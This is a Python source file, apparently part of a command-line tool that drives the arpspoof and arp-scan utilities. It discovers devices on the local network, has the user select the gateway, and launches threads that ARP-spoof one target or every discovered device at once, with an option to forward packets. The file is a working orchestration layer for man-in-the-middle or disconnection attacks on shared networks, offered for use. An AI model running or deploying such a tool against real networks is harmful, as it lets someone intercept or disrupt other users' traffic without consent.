# Tools for arpspoofing

import utils.app_properties as app
import utils.app_tools as app_tools
import utils.net_tools as net_tools
import utils.arpspoof_thread as thread_manager


ip_addresses = list()
mac_addresses = list()
complete_data = False


def select_executable(executable: app.ARPCommand):
    file = app_tools.select_file(app.config.IS_UNIX_LIKE_SYSTEM)
    command = file.name
    if app.config.IS_UNIX_LIKE_SYSTEM:
        command = "./" + command

    if executable == app.ARPCommand.ARPSPOOF:
        app.config.arpspoof_command = command
        app.config.arpspoof_path = str(file.parent)
    elif executable == app.ARPCommand.ARP_SCAN:
        app.config.arp_scan_command = command
        app.config.arp_scan_path = str(file.parent)
    else:
        raise ValueError(f"{executable} is not interchangeable")

    app.write_config()


def get_arp_command(executable: app.ARPCommand) -> tuple:
    cwd = ""
    if executable == app.ARPCommand.IP_A:
        command = app.config.ip_a_command
    elif executable == app.ARPCommand.ARP:
        command = "arp"
    elif executable == app.ARPCommand.ARPSPOOF:
        command = app.config.arpspoof_command
        cwd = app.config.arpspoof_path
    else:
        command = app.config.arp_scan_command
        cwd = app.config.arp_scan_path

    return command, cwd


def ask_to_provide_a_copy(command: str, executable: app.ARPCommand) -> tuple:
    app_tools.clear_screen(app.config.IS_UNIX_LIKE_SYSTEM)

    exit_code = 0
    print(f"{command.replace('./', '')} command not found!")
    print("Do you want to provide a copy?")
    print("1. Yes")
    print("2. No, exit")
    try:
        if app_tools.select_option(["1", "2"], [True, False]):
            select_executable(executable)
            return get_arp_command(executable)
    except InterruptedError:
        print("No file provided, exiting...")
        exit_code = 1

    exit(exit_code)


def look_up_for_arp_command(executable: app.ARPCommand, required: bool, can_provide_a_copy: bool):
    command, cwd = get_arp_command(executable)
    command_availability = app_tools.is_command_available(command, cwd)

    while command_availability != 0:
        if command_availability == 1:
            if required and can_provide_a_copy:
                command, cwd = ask_to_provide_a_copy(command, executable)
            elif required and not can_provide_a_copy:
                print(f"{command.replace('./', '')} is required, please check 'Dependencies' section in README.md")
                exit(1)

        if command_availability == 2:
            print(f"{command.replace('./', '')} requires elevated privileges!")
            if app.config.IS_UNIX_LIKE_SYSTEM:
                print("    Try: sudo or doas")
            exit(1)

        command_availability = app_tools.is_command_available(command, cwd)


def setup_utility(ask_to_change_interface=False):
    global ip_addresses, mac_addresses, complete_data

    app_tools.clear_screen(app.config.IS_UNIX_LIKE_SYSTEM)

    print("  Setup")
    if app.config.IS_UNIX_LIKE_SYSTEM:
        if app.config.interface and ask_to_change_interface:
            print("Do you want to setup other interface?")
            print("1. Yes")
            print("2. No")
            if app_tools.select_option(["1", "2"], [True, False]):
                app.config.interface = ""

        if not app.config.interface:
            app.config.interface = net_tools.select_interface()

    if not app.config.arp_scan_path:
        ip_addresses, mac_addresses, mdns_ip, complete_data = net_tools.list_devices_with_arp(app.config.interface)
    else:
        ip_addresses, mac_addresses, mdns_ip, complete_data = net_tools.list_devices_with_arp_scan(app.config.interface)

    app.config.mdns_ip = mdns_ip

    if app.config.router_ip not in ip_addresses:
        if complete_data:
            devices = app_tools.merge_lists(ip_addresses, mac_addresses)
            printable_ips, options = app_tools.enumerate_list(devices)
        else:
            printable_ips, options = app_tools.enumerate_list(ip_addresses)

        print(printable_ips)
        print("Select the router (gateway) IP")
        app.config.router_ip = app_tools.select_option(options, ip_addresses)

    app.config.setup_completed = True
    app.write_config()


def print_debug_data():
    larger_key = 0

    for key in app.PROPERTIES:
        if len(key) > larger_key:
            larger_key = len(key)

    larger_key += 1

    print("[ INFO ]  Temporally data")
    missing_keys = ["SYSTEM_NAME", "IS_UNIX_LIKE_SYSTEM", "SETUP_COMPLETED"]
    values = [app.config.SYSTEM_NAME, app.config.IS_UNIX_LIKE_SYSTEM, app.config.setup_completed]

    for key, value in zip(missing_keys, values):
        spacing = " " * (larger_key - len(key))
        print(f"{key.upper()}{spacing}{value}")

    for key in app.PROPERTIES:
        spacing = " " * (larger_key - len(key))
        print(f"{key.upper()}{spacing}{getattr(app.config, key.lower())}")


def arpspoof_device(target_ip=None, return_status=False):
    global ip_addresses, mac_addresses, complete_data

    app_tools.clear_screen(app.config.IS_UNIX_LIKE_SYSTEM)

    filtered_ips = list()

    if target_ip is None:
        if app.config.scan_every_arpspoof:
            setup_utility(False)

        filtered_ips, filtered_macs = thread_manager.filter_ips(ip_addresses, mac_addresses, complete_data)

        if not filtered_ips:
            print("All devices have been ARPSpoofed!")
            input("  Press enter to continue ")
            return False

        if complete_data:
            devices = app_tools.merge_lists(filtered_ips, filtered_macs)
            printable_ips, options = app_tools.enumerate_list(devices)
        else:
            printable_ips, options = app_tools.enumerate_list(filtered_ips)

        extra_options = ["E"]

        print("  Devices discovered")
        print(printable_ips)
        if return_status:
            print("A. All")
            extra_options.append("A")

        print("E. Cancel")
        print("Select your target IP")
        target_ip = app_tools.select_option(options + extra_options, filtered_ips + extra_options)

    if target_ip == "E":
        return False

    if target_ip == app.config.router_ip:
        print("You can't ARPSpoof the router!")
        input("  Press enter to continue ")
        return True

    if thread_manager.is_ip_targeted(target_ip):
        print(f"A thread is already arpspoofing target {target_ip}")
        input("  Press enter to continue ")
        return True

    if target_ip == "A":
        for ip in filtered_ips:
            thread_manager.created_threads.append(
                thread_manager.ARPSpoofThread(
                    app.config.interface, app.config.router_ip,
                    ip, app.config.allow_package_forwarding
                )
            )

        input("  Press enter to continue ")

        return False

    thread = thread_manager.ARPSpoofThread(
        app.config.interface, app.config.router_ip,
        target_ip, app.config.allow_package_forwarding
    )

    thread_manager.created_threads.append(thread)
    if return_status:
        return True
    else:
        input("  Press enter to continue ")


def arpspoof_devices():
    while arpspoof_device(None, True):
        pass
